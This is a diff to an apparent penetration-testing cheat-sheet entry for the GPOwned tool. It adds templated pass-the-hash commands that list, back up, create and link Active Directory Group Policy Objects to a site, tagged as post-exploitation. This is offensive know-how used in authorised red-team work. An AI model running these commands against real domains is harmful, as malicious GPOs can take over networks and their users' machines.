@@ -1,7 +1,7 @@
 # GPOwned
 
 % Active directory, gpo 
-#plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
+#plateform/linux #target/remote #cat/POSTEXPLOIT/GPO  
 
 
 ## GPOwned - desc
@@ -22,5 +22,22 @@ https://github.com/X-C3LL/GPOwned
 ```
 ```
 
-## 
+## list GPO
+```
+GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -listgpo -gpcmachine
+```
 
+## backup GPO
+```
+GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine  -backup <backup_name> -name "{<gpo_cn>}"
+```
+
+## create GPO
+```
+GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -creategpo -name "<gpo_name|jubeaz>" -comment "<gpo_comment|pwn>"
+```
+
+## link GPO to a site
+```
+GPOwned.py -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn> -gpcmachine -linkgpotosite -name "<gpo_name|jubeaz>" -sitename "<site_name|Default-First-Site-Name>"
+```
